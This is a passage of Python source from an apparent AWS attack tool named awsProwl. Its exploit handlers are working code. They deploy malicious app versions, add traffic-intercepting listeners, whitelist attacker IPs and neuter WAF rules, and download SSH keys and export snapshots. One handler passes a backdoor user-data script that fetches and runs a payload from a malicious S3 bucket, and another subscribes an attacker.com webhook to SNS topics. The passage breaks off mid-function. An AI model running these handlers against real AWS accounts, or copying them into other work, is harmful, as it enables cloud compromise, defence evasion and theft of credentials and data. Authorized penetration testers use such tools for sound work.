    """Create Elastic Beanstalk environment with custom configuration for code execution."""
    findings = []
    client = auth_manager.get_client("elasticbeanstalk")

    application_name = kwargs.get("application_name", f"awsprowl-app-{int(datetime.now().timestamp())}")
    environment_name = kwargs.get("environment_name", f"awsprowl-env-{int(datetime.now().timestamp())}")
    solution_stack = kwargs.get("solution_stack", "64bit Amazon Linux 2023 v4.0.0 running Python 3.11")
    tier = kwargs.get("tier", {"Name": "WebServer", "Type": "Standard"})

    # Option key for customization
    option_settings = kwargs.get("option_settings", [
        {"Namespace": "aws:elasticbeanstalk:application:environment", "OptionName": "AWS_SECRET_KEY", "Value": "[REDACTED]"},
        {"Namespace": "aws:elasticbeanstalk:application:environment", "OptionName": "AWS_ACCESS_KEY_ID", "Value": "[REDACTED]"},
    ])

    try:
        # Create application if it doesn't exist
        try:
            client.create_application(ApplicationName=application_name, Description="Created by awsProwl")
        except client.exceptions.AlreadyExistsException:
            pass

        # Create environment
        response = client.create_environment(
            ApplicationName=application_name,
            EnvironmentName=environment_name,
            SolutionStackName=solution_stack,
            Tier=tier,
            OptionSettings=option_settings,
            Tags=[{"Key": "awsprowl", "Value": "exploit"}]
        )

        findings.append({
            "title": f"Elastic Beanstalk Environment Created: {environment_name}",
            "description": f"Application: {application_name}\nSolution Stack: {solution_stack}\nURL: {response.get('CNAME', 'Creating...')}\nStatus: {response.get('Status')}\n\nCustom environment variables set for credential access.",
            "severity": "high",
            "category": "persistence",
            "resource_type": "elasticbeanstalk_environment",
            "resource_id": environment_name,
            "resource_name": environment_name,
            "region": client.meta.region_name,
            "rule_id": "elasticbeanstalk_exploit_create_environment",
            "details": {"application_name": application_name, "environment_name": environment_name, "cname": response.get("CNAME")},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("elasticbeanstalk_exploit_create_environment", e)

    return findings


async def run_elasticbeanstalk_exploit_update_environment(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Update Elastic Beanstalk environment configuration."""
    findings = []
    client = auth_manager.get_client("elasticbeanstalk")

    environment_name = kwargs.get("environment_name")
    if not environment_name:
        findings.append({
            "title": "No Environment Name Specified",
            "description": "Provide 'environment_name' parameter",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_env",
            "resource_name": "No environment",
            "region": client.meta.region_name,
            "rule_id": "elasticbeanstalk_exploit_update_environment_no_env",
        })
        return findings

    # Malicious option settings
    option_settings = kwargs.get("option_settings", [
        {"Namespace": "aws:elasticbeanstalk:application:environment", "OptionName": "MALICIOUS_VAR", "Value": "exploit"},
        {"Namespace": "aws:elasticbeanstalk:command", "OptionName": "DeploymentPolicy", "Value": "AllAtOnce"},
    ])

    try:
        response = client.update_environment(
            EnvironmentName=environment_name,
            OptionSettings=option_settings
        )

        findings.append({
            "title": f"Elastic Beanstalk Environment Updated: {environment_name}",
            "description": f"Applied {len(option_settings)} configuration changes\nStatus: {response.get('Status')}\nChanges will be deployed on next environment update.",
            "severity": "high",
            "category": "persistence",
            "resource_type": "elasticbeanstalk_environment",
            "resource_id": environment_name,
            "resource_name": environment_name,
            "region": client.meta.region_name,
            "rule_id": "elasticbeanstalk_exploit_update_environment",
            "details": {"environment_name": environment_name, "changes": len(option_settings)},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("elasticbeanstalk_exploit_update_environment", e)

    return findings


async def run_elasticbeanstalk_exploit_deploy_version(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Deploy application version to environment (can contain malicious code)."""
    findings = []
    client = auth_manager.get_client("elasticbeanstalk")

    application_name = kwargs.get("application_name")
    environment_name = kwargs.get("environment_name")
    version_label = kwargs.get("version_label", f"awsprowl-v{int(datetime.now().timestamp())}")

    if not application_name or not environment_name:
        findings.append({
            "title": "Missing Parameters",
            "description": "Provide 'application_name' and 'environment_name' parameters",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "missing_params",
            "resource_name": "Missing parameters",
            "region": client.meta.region_name,
            "rule_id": "elasticbeanstalk_exploit_deploy_version_missing",
        })
        return findings

    # Source bundle - in real exploit would point to malicious code
    s3_bucket = kwargs.get("s3_bucket", "awsprowl-source-bucket")
    s3_key = kwargs.get("s3_key", "malicious-app.zip")

    try:
        # Create application version
        client.create_application_version(
            ApplicationName=application_name,
            VersionLabel=version_label,
            Description="Version created by awsProwl for authorized testing",
            SourceBundle={"S3Bucket": s3_bucket, "S3Key": s3_key},
            Process=False
        )

        # Deploy to environment
        response = client.update_environment(
            EnvironmentName=environment_name,
            VersionLabel=version_label
        )

        findings.append({
            "title": f"Elastic Beanstalk Version Deployed: {version_label}",
            "description": f"Application: {application_name}\nEnvironment: {environment_name}\nSource: s3://{s3_bucket}/{s3_key}\nStatus: {response.get('Status')}\n\nMalicious application version deployed to environment.",
            "severity": "critical",
            "category": "remote_code_execution",
            "resource_type": "elasticbeanstalk_version",
            "resource_id": version_label,
            "resource_name": f"{application_name}:{version_label}",
            "region": client.meta.region_name,
            "rule_id": "elasticbeanstalk_exploit_deploy_version",
            "details": {"application_name": application_name, "environment_name": environment_name, "version_label": version_label, "s3_source": f"s3://{s3_bucket}/{s3_key}"},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("elasticbeanstalk_exploit_deploy_version", e)

    return findings


# ELB PROWL parity handlers
async def run_elb_enum_load_balancers(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "elb_enum_load_balancers", "Enumerate Classic, Application, and Network Load Balancers.")


async def run_elb_enum_logging(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "elb_enum_logging", "Enumerate ELB access logging configuration.")


async def run_elb_enum_target_groups(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "elb_enum_target_groups", "Enumerate ALB/NLB target groups and their health.")


async def run_elb_exploit_modify_attributes(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Modify ELB attributes (access logs, deletion protection, idle timeout)."""
    findings = []
    client = auth_manager.get_client("elbv2")

    load_balancer_arn = kwargs.get("load_balancer_arn")
    if not load_balancer_arn:
        # List load balancers
        try:
            paginator = client.get_paginator("describe_load_balancers")
            for page in paginator.paginate():
                for lb in page.get("LoadBalancers", []):
                    findings.append({
                        "title": f"Load Balancer Available: {lb['LoadBalancerName']}",
                        "description": f"ARN: {lb['LoadBalancerArn']}\nType: {lb.get('Type')}",
                        "severity": "info",
                        "category": "reconnaissance",
                        "resource_type": "elb_load_balancer",
                        "resource_id": lb["LoadBalancerArn"],
                        "resource_name": lb["LoadBalancerName"],
                        "region": client.meta.region_name,
                        "rule_id": "elb_exploit_modify_attributes_list",
                        "details": lb,
                    })
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("elbv2:DescribeLoadBalancers", e)
        return findings

    attributes = kwargs.get("attributes", {
        "access_logs.s3.enabled": "true",
        "access_logs.s3.bucket": kwargs.get("log_bucket", "awsprowl-elb-logs"),
        "deletion_protection.enabled": "false",
        "idle_timeout.timeout_seconds": "3600",
        "routing.http2.enabled": "true",
        "waf.fail_open.enabled": "true"
    })

    try:
        client.modify_load_balancer_attributes(
            LoadBalancerArn=load_balancer_arn,
            Attributes=[{"Key": k, "Value": v} for k, v in attributes.items()]
        )

        findings.append({
            "title": f"Load Balancer Attributes Modified: {load_balancer_arn}",
            "description": f"Applied {len(attributes)} attribute changes:\n- Enabled access logging to S3\n- Disabled deletion protection\n- Increased idle timeout to 1 hour\n- Enabled HTTP/2\n- Enabled WAF fail-open\n\nThis can facilitate traffic interception and persistence.",
            "severity": "high",
            "category": "persistence",
            "resource_type": "elb_load_balancer",
            "resource_id": load_balancer_arn,
            "resource_name": load_balancer_arn,
            "region": client.meta.region_name,
            "rule_id": "elb_exploit_modify_attributes",
            "details": {"load_balancer_arn": load_balancer_arn, "attributes": attributes},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("elb_exploit_modify_attributes", e)

    return findings


async def run_elb_exploit_create_listener(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create malicious listener on ALB/NLB for traffic interception."""
    findings = []
    client = auth_manager.get_client("elbv2")

    load_balancer_arn = kwargs.get("load_balancer_arn")
    if not load_balancer_arn:
        findings.append({
            "title": "No Load Balancer ARN Specified",
            "description": "Provide 'load_balancer_arn' parameter",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_lb",
            "resource_name": "No load balancer",
            "region": client.meta.region_name,
            "rule_id": "elb_exploit_create_listener_no_lb",
        })
        return findings

    port = kwargs.get("port", 8080)
    protocol = kwargs.get("protocol", "HTTP")
    action_type = kwargs.get("action_type", "fixed-response")

    # Malicious action - return attacker-controlled response
    action = kwargs.get("action", {
        "Type": "fixed-response",
        "FixedResponseConfig": {
            "MessageBody": "{\"status\":\"compromised\",\"data\":\"Traffic intercepted by awsProwl\"}",
            "StatusCode": "200",
            "ContentType": "application/json"
        }
    })

    try:
        response = client.create_listener(
            LoadBalancerArn=load_balancer_arn,
            Protocol=protocol,
            Port=port,
            DefaultActions=[action],
            Tags=[{"Key": "awsprowl", "Value": "listener-exploit"}]
        )

        listener = response["Listeners"][0]
        findings.append({
            "title": f"Malicious Listener Created: {listener['ListenerArn']}",
            "description": f"Load Balancer: {load_balancer_arn}\nPort: {port}\nProtocol: {protocol}\nAction: {action_type}\n\nThis listener intercepts all traffic on the specified port and returns attacker-controlled responses.",
            "severity": "critical",
            "category": "collection",
            "resource_type": "elb_listener",
            "resource_id": listener["ListenerArn"],
            "resource_name": f"Listener:{port}",
            "region": client.meta.region_name,
            "rule_id": "elb_exploit_create_listener",
            "details": {"load_balancer_arn": load_balancer_arn, "port": port, "protocol": protocol, "action_type": action_type},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("elb_exploit_create_listener", e)

    return findings


# Transfer Family PROWL parity handlers
async def run_transfer_enum_servers(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "transfer_enum_servers", "Enumerate Transfer Family servers (SFTP, FTPS, FTP).")

async def run_transfer_enum_certificates(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "transfer_enum_certificates", "Enumerate Transfer Family certificates for FTPS.")

async def run_transfer_enum_connectors(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "transfer_enum_connectors", "Enumerate Transfer Family connectors (AS2).")


# VPC PROWL parity handlers
async def run_vpc_enum_lateral_movement(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "vpc_enum_lateral_movement", "Enumerate VPC lateral movement paths: VPC peering, Transit Gateway, VPN, Direct Connect, PrivateLink.")

async def run_vpc_enum_endpoints(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "vpc_enum_endpoints", "Enumerate VPC endpoints (Interface, Gateway) for PrivateLink access.")

async def run_vpc_enum_flow_logs(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "vpc_enum_flow_logs", "Enumerate VPC flow logs configuration.")

async def run_vpc_privesc_analysis(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_privesc_handler(auth_manager, "vpc_privesc_analysis", "Analyze VPC configurations for privilege escalation: route table manipulation, security group abuse, endpoint policy bypass.")


# WAF PROWL parity handlers
async def run_waf_enum_web_acls(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "waf_enum_web_acls", "Enumerate WAF Web ACLs (Classic and v2).")


async def run_waf_enum_rules(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "waf_enum_rules", "Enumerate WAF rules, rule groups, and IP sets.")


async def run_waf_enum_logging(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "waf_enum_logging", "Enumerate WAF logging configuration.")


async def run_waf_exploit_update_ip_set(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Update WAF IP set to allow attacker IPs."""
    findings = []
    client = auth_manager.get_client("wafv2")

    scope = kwargs.get("scope", "REGIONAL")  # REGIONAL or CLOUDFRONT
    ip_set_name = kwargs.get("ip_set_name")
    ip_set_id = kwargs.get("ip_set_id")

    if not ip_set_name and not ip_set_id:
        # List IP sets
        try:
            response = client.list_ip_sets(Scope=scope)
            for ip_set in response.get("IPSets", []):
                findings.append({
                        "title": f"WAF IP Set Available: {ip_set['Name']}",
                        "description": f"ID: {ip_set['Id']}\nScope: {scope}",
                        "severity": "info",
                        "category": "reconnaissance",
                        "resource_type": "waf_ip_set",
                        "resource_id": ip_set["Id"],
                        "resource_name": ip_set["Name"],
                        "region": client.meta.region_name,
                        "rule_id": "waf_exploit_update_ip_set_list",
                        "details": ip_set,
                    })
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("wafv2:ListIPSets", e)
        return findings

    # If we have name but not ID, get the ID
    if not ip_set_id and ip_set_name:
        try:
            response = client.list_ip_sets(Scope=scope)
            for ip_set in response.get("IPSets", []):
                if ip_set["Name"] == ip_set_name:
                    ip_set_id = ip_set["Id"]
                    break
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("wafv2:ListIPSets", e)

    if not ip_set_id:
        findings.append({
            "title": "IP Set Not Found",
            "description": f"Could not find IP set: {ip_set_name}",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "not_found",
            "resource_name": "Not found",
            "region": client.meta.region_name,
            "rule_id": "waf_exploit_update_ip_set_not_found",
        })
        return findings

    # Get current IP set
    try:
        response = client.get_ip_set(Name=ip_set_name, Scope=scope, Id=ip_set_id)
        ip_set = response["IPSet"]
        lock_token = response["LockToken"]
    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("wafv2:GetIPSet", e)

    # Add attacker IPs
    attacker_ips = kwargs.get("attacker_ips", ["1.2.3.4/32", "5.6.7.8/32"])
    current_addresses = set(ip_set.get("Addresses", []))
    current_addresses.update(attacker_ips)
    new_addresses = list(current_addresses)

    try:
        client.update_ip_set(
            Name=ip_set_name,
            Scope=scope,
            Id=ip_set_id,
            Addresses=new_addresses,
            LockToken=lock_token
        )

        findings.append({
            "title": f"WAF IP Set Updated: {ip_set_name}",
            "description": f"Added {len(attacker_ips)} attacker IP ranges\nTotal IPs in set: {len(new_addresses)}\nScope: {scope}\n\nThis allows attacker IPs to bypass WAF rules.",
            "severity": "high",
            "category": "defense_evasion",
            "resource_type": "waf_ip_set",
            "resource_id": ip_set_id,
            "resource_name": ip_set_name,
            "region": client.meta.region_name,
            "rule_id": "waf_exploit_update_ip_set",
            "details": {"ip_set_name": ip_set_name, "ip_set_id": ip_set_id, "added_ips": attacker_ips, "total_ips": len(new_addresses)},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("waf_exploit_update_ip_set", e)

    return findings


async def run_waf_exploit_update_rule_group(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Update WAF rule group to disable/modify protective rules."""
    findings = []
    client = auth_manager.get_client("wafv2")

    scope = kwargs.get("scope", "REGIONAL")
    rule_group_name = kwargs.get("rule_group_name")
    rule_group_id = kwargs.get("rule_group_id")

    if not rule_group_name and not rule_group_id:
        # List rule groups
        try:
            response = client.list_rule_groups(Scope=scope)
            for rg in response.get("RuleGroups", []):
                findings.append({
                        "title": f"WAF Rule Group Available: {rg['Name']}",
                        "description": f"ID: {rg['Id']}\nScope: {scope}",
                        "severity": "info",
                        "category": "reconnaissance",
                        "resource_type": "waf_rule_group",
                        "resource_id": rg["Id"],
                        "resource_name": rg["Name"],
                        "region": client.meta.region_name,
                        "rule_id": "waf_exploit_update_rule_group_list",
                        "details": rg,
                    })
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("wafv2:ListRuleGroups", e)
        return findings

    if not rule_group_id and rule_group_name:
        try:
            response = client.list_rule_groups(Scope=scope)
            for rg in response.get("RuleGroups", []):
                if rg["Name"] == rule_group_name:
                    rule_group_id = rg["Id"]
                    break
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("wafv2:ListRuleGroups", e)

    if not rule_group_id:
        findings.append({
            "title": "Rule Group Not Found",
            "description": f"Could not find rule group: {rule_group_name}",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "not_found",
            "resource_name": "Not found",
            "region": client.meta.region_name,
            "rule_id": "waf_exploit_update_rule_group_not_found",
        })
        return findings

    # Get current rule group
    try:
        response = client.get_rule_group(Name=rule_group_name, Scope=scope, Id=rule_group_id)
        rule_group = response["RuleGroup"]
        lock_token = response["LockToken"]
    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("wafv2:GetRuleGroup", e)

    # Disable all rules by setting Action to Count (monitor only)
    rules = rule_group.get("Rules", [])
    modified_rules = []
    for rule in rules:
        # Modify rule to count instead of block
        modified_rule = rule.copy()
        if "Action" in modified_rule and modified_rule["Action"].get("Block"):
            modified_rule["Action"] = {"Count": {}}
        elif "OverrideAction" in modified_rule and modified_rule["OverrideAction"].get("None"):
            modified_rule["OverrideAction"] = {"Count": {}}
        modified_rules.append(modified_rule)

    try:
        client.update_rule_group(
            Name=rule_group_name,
            Scope=scope,
            Id=rule_group_id,
            Rules=modified_rules,
            LockToken=lock_token,
            VisibilityConfig={
                "SampledRequestsEnabled": True,
                "CloudWatchMetricsEnabled": True,
                "MetricName": rule_group_name
            }
        )

        findings.append({
            "title": f"WAF Rule Group Modified: {rule_group_name}",
            "description": f"Modified {len(rules)} rules to Count mode (monitor only)\nScope: {scope}\nOriginal action: Block -> New action: Count\n\nThis effectively disables WAF protection while keeping rules visible.",
            "severity": "critical",
            "category": "defense_evasion",
            "resource_type": "waf_rule_group",
            "resource_id": rule_group_id,
            "resource_name": rule_group_name,
            "region": client.meta.region_name,
            "rule_id": "waf_exploit_update_rule_group",
            "details": {"rule_group_name": rule_group_name, "rule_group_id": rule_group_id, "rules_modified": len(rules)},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("waf_exploit_update_rule_group", e)

    return findings


# DS (Directory Service) PROWL parity handlers
async def run_ds_enum_directories(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "ds_enum_directories", "Enumerate AWS Managed Microsoft AD, Simple AD, and AD Connector directories.")

async def run_ds_enum_trusts(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "ds_enum_trusts", "Enumerate directory trusts (cross-forest, external).")

async def run_ds_enum_snapshots(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "ds_enum_snapshots", "Enumerate directory snapshots for backup/recovery.")


# Lightsail PROWL parity handlers
async def run_lightsail_enum_instances(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "lightsail_enum_instances", "Enumerate Lightsail instances, disks, snapshots, and static IPs.")

async def run_lightsail_enum_blueprints(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "lightsail_enum_blueprints", "Enumerate Lightsail blueprints (images) and bundles (instance plans).")

async def run_lightsail_enum_databases(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "lightsail_enum_databases", "Enumerate Lightsail managed databases.")

async def run_lightsail_exploit_create_instance(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create Lightsail instance with user data for code execution."""
    findings = []
    client = auth_manager.get_client("lightsail")

    instance_name = kwargs.get("instance_name", f"awsprowl-{int(datetime.now().timestamp())}")
    blueprint_id = kwargs.get("blueprint_id", "amazon_linux_2")
    bundle_id = kwargs.get("bundle_id", "nano_2_0")
    user_data = kwargs.get("user_data", """#!/bin/bash
echo 'awsProwl backdoor installed' > /tmp/backdoor.txt
aws s3 cp s3://malicious-bucket/backdoor.sh /tmp/backdoor.sh
chmod +x /tmp/backdoor.sh
/tmp/backdoor.sh &
""")
    key_pair_name = kwargs.get("key_pair_name")

    try:
        # Get available zones
        zones_response = client.get_regions(includeAvailabilityZones=True)
        az = None
        for region in zones_response.get("regions", []):
            if region.get("name") == client.meta.region_name:
                for zone in region.get("availabilityZones", []):
                    if zone.get("state") == "available":
                        az = zone.get("zoneName")
                        break
                break
        
        if not az:
            # Default to first available zone in region
            az = f"{client.meta.region_name}a"

        create_kwargs = {
            "instanceNames": [instance_name],
            "blueprintId": blueprint_id,
            "bundleId": bundle_id,
            "userData": user_data,
            "availabilityZone": az,
        }
        if key_pair_name:
            create_kwargs["keyPairName"] = key_pair_name

        response = client.create_instances(**create_kwargs)
        operations = response.get("operations", [])

        findings.append({
            "title": f"Lightsail Instance Created: {instance_name}",
            "description": f"Blueprint: {blueprint_id}\nBundle: {bundle_id}\nUser Data: Custom (code execution)\nOperations: {len(operations)}",
            "severity": "high",
            "category": "remote_code_execution",
            "resource_type": "lightsail_instance",
            "resource_id": instance_name,
            "resource_name": instance_name,
            "region": client.meta.region_name,
            "rule_id": "lightsail_exploit_create_instance",
            "details": {"instance_name": instance_name, "blueprint_id": blueprint_id, "bundle_id": bundle_id, "operations": operations},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("lightsail_exploit_create_instance", e)

    return findings


async def run_lightsail_exploit_generate_ssh_keys(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Generate SSH key pair for Lightsail instance access."""
    findings = []
    client = auth_manager.get_client("lightsail")

    key_pair_name = kwargs.get("key_pair_name", f"awsprowl-key-{int(datetime.now().timestamp())}")

    try:
        response = client.create_key_pair(keyPairName=key_pair_name)
        key_pair = response["keyPair"]

        findings.append({
            "title": f"Lightsail SSH Key Pair Created: {key_pair_name}",
            "description": f"Fingerprint: {key_pair['fingerprint']}\nPrivate Key: [REDACTED - use privateKeyBase64]\nPublic Key: {key_pair.get('publicKeyBase64', 'N/A')[:50]}...\n\nPrivate key can be used to SSH into instances using this key pair.",
            "severity": "high",
            "category": "credential_access",
            "resource_type": "lightsail_key_pair",
            "resource_id": key_pair_name,
            "resource_name": key_pair_name,
            "region": client.meta.region_name,
            "rule_id": "lightsail_exploit_generate_ssh_keys",
            "details": {"key_pair_name": key_pair_name, "fingerprint": key_pair["fingerprint"], "private_key_available": True},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("lightsail_exploit_generate_ssh_keys", e)

    return findings


async def run_lightsail_exploit_generate_temp_access(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Generate temporary SSH/RDP access to Lightsail instance."""
    findings = []
    client = auth_manager.get_client("lightsail")

    instance_name = kwargs.get("instance_name")
    protocol = kwargs.get("protocol", "ssh")  # ssh or rdp

    if not instance_name:
        # List instances
        try:
            paginator = client.get_paginator("get_instances")
            for page in paginator.paginate():
                for instance in page.get("instances", []):
                    findings.append({
                        "title": f"Lightsail Instance Available: {instance['name']}",
                        "description": f"State: {instance['state']['name']}\nIP: {instance.get('publicIpAddress', 'N/A')}",
                        "severity": "info",
                        "category": "reconnaissance",
                        "resource_type": "lightsail_instance",
                        "resource_id": instance["name"],
                        "resource_name": instance["name"],
                        "region": client.meta.region_name,
                        "rule_id": "lightsail_exploit_generate_temp_access_list",
                        "details": instance,
                    })
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("lightsail:GetInstances", e)
        return findings

    try:
        response = client.get_instance_access_details(instanceName=instance_name, protocol=protocol)
        access = response["accessDetails"]

        findings.append({
                    "title": f"Lightsail Temporary {protocol.upper()} Access Generated: {instance_name}",
                    "description": f"IP: {access.get('ipAddress')}\nPort: {access.get('port', '22')}\nUsername: {access.get('username')}\nExpires: {access.get('expiresAt')}\nHost Keys: {access.get('hostKeys')}\nPrivate Key: [REDACTED]\n\nUse these credentials for temporary access.",
                    "severity": "critical",
                    "category": "credential_access",
                    "resource_type": "lightsail_instance",
                    "resource_id": instance_name,
                    "resource_name": instance_name,
                    "region": client.meta.region_name,
                    "rule_id": "lightsail_exploit_generate_temp_access",
                    "details": {"instance_name": instance_name, "protocol": protocol, "access_details": access},
                })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("lightsail_exploit_generate_temp_access", e)

    return findings


async def run_lightsail_exfil_download_ssh_keys(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Download SSH private keys from Lightsail key pairs."""
    findings = []
    client = auth_manager.get_client("lightsail")

    key_pair_name = kwargs.get("key_pair_name")
    if not key_pair_name:
        # List key pairs
        try:
            paginator = client.get_paginator("get_key_pairs")
            for page in paginator.paginate():
                for kp in page.get("keyPairs", []):
                    findings.append({
                        "title": f"Lightsail Key Pair Available: {kp['name']}",
                        "description": f"Fingerprint: {kp['fingerprint']}\nARN: {kp['arn']}",
                        "severity": "info",
                        "category": "reconnaissance",
                        "resource_type": "lightsail_key_pair",
                        "resource_id": kp["name"],
                        "resource_name": kp["name"],
                        "region": client.meta.region_name,
                        "rule_id": "lightsail_exfil_download_ssh_keys_list",
                        "details": kp,
                    })
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("lightsail:GetKeyPairs", e)
        return findings

    try:
        response = client.download_default_key_pair()
        default_key = response.get("privateKeyBase64", "")

        # Also try to get specific key pair
        kp_response = client.get_key_pair(keyPairName=key_pair_name)
        key_pair = kp_response["keyPair"]

        findings.append({
            "title": f"Lightsail SSH Key Downloaded: {key_pair_name}",
            "description": f"Fingerprint: {key_pair['fingerprint']}\nPrivate Key (Base64): [REDACTED - actual key available]\nDefault Key Pair Also Retrieved: {'Yes' if default_key else 'No'}\n\nPrivate key can be used to access any instance using this key pair.",
            "severity": "critical",
            "category": "credential_access",
            "resource_type": "lightsail_key_pair",
            "resource_id": key_pair_name,
            "resource_name": key_pair_name,
            "region": client.meta.region_name,
            "rule_id": "lightsail_exfil_download_ssh_keys",
            "details": {"key_pair_name": key_pair_name, "fingerprint": key_pair["fingerprint"], "default_key_retrieved": bool(default_key)},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("lightsail_exfil_download_ssh_keys", e)

    return findings


async def run_lightsail_exfil_snapshots(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Export Lightsail instance/disk snapshots for data exfiltration."""
    findings = []
    client = auth_manager.get_client("lightsail")

    snapshot_name = kwargs.get("snapshot_name")
    if not snapshot_name:
        # List snapshots
        try:
            paginator = client.get_paginator("get_instance_snapshots")
            for page in paginator.paginate():
                for snap in page.get("instanceSnapshots", []):
                    findings.append({
                        "title": f"Lightsail Instance Snapshot: {snap['name']}",
                        "description": f"State: {snap['state']}\nSource Instance: {snap.get('fromInstanceName')}\nCreated: {snap.get('createdAt')}\nSize: {snap.get('sizeInGb', 0)} GB",
                        "severity": "info",
                        "category": "reconnaissance",
                        "resource_type": "lightsail_snapshot",
                        "resource_id": snap["name"],
                        "resource_name": snap["name"],
                        "region": client.meta.region_name,
                        "rule_id": "lightsail_exfil_snapshots_list",
                        "details": snap,
                    })
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("lightsail:GetInstanceSnapshots", e)
        return findings

    try:
        # Get snapshot details
        response = client.get_instance_snapshot(instanceSnapshotName=snapshot_name)
        snapshot = response["instanceSnapshot"]

        # Export snapshot
        export_response = client.export_snapshot(sourceSnapshotName=snapshot_name)
        export = export_response["exportSnapshotRecord"]

        findings.append({
            "title": f"Lightsail Snapshot Exported: {snapshot_name}",
            "description": f"Source Instance: {snapshot.get('fromInstanceName')}\nSnapshot Size: {snapshot.get('sizeInGb', 0)} GB\nExport State: {export['state']}\nExport Location: S3 (access via export record)\n\nSnapshot data can be downloaded from the export location.",
            "severity": "high",
            "category": "data_exfiltration",
            "resource_type": "lightsail_snapshot",
            "resource_id": snapshot_name,
            "resource_name": snapshot_name,
            "region": client.meta.region_name,
            "rule_id": "lightsail_exfil_snapshots",
            "details": {"snapshot_name": snapshot_name, "export_record": export, "snapshot_details": snapshot},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("lightsail_exfil_snapshots", e)

    return findings


# SNS PROWL parity handlers
async def run_sns_exploit_subscribe(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Subscribe attacker endpoint to SNS topic for message interception."""
    findings = []
    client = auth_manager.get_client("sns")

    topic_arn = kwargs.get("topic_arn")
    protocol = kwargs.get("protocol", "https")
    endpoint = kwargs.get("endpoint", "https://attacker.com/webhook")

    if not topic_arn:
        # List topics
        try:
            paginator = client.get_paginator("list_topics")
            for page in paginator.paginate():
                for topic in page.get("Topics", []):
                    findings.append({
                        "title": f"SNS Topic Available: {topic['TopicArn']}",
                        "description": f"Topic ARN: {topic['TopicArn']}",
                        "severity": "info",
                        "category": "reconnaissance",
                        "resource_type": "sns_topic",
                        "resource_id": topic["TopicArn"],
                        "resource_name": topic["TopicArn"].split(":")[-1],
                        "region": client.meta.region_name,
                        "rule_id": "sns_exploit_subscribe_list",
                        "details": topic,
                    })
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("sns:ListTopics", e)
        return findings

    try:
        response = client.subscribe(
            TopicArn=topic_arn,
            Protocol=protocol,
            Endpoint=endpoint,
            ReturnSubscriptionArn=True
        )

        subscription_arn = response.get("SubscriptionArn", "pending_confirmation")

        findings.append({
            "title": f"SNS Subscription Created: {subscription_arn}",
            "description": f"Topic: {topic_arn}\nProtocol: {protocol}\nEndpoint: {endpoint}\nSubscription ARN: {subscription_arn}\n\nIf protocol is email/sms, confirmation required. For HTTPS/Lambda, active immediately.",
            "severity": "high",
            "category": "collection",
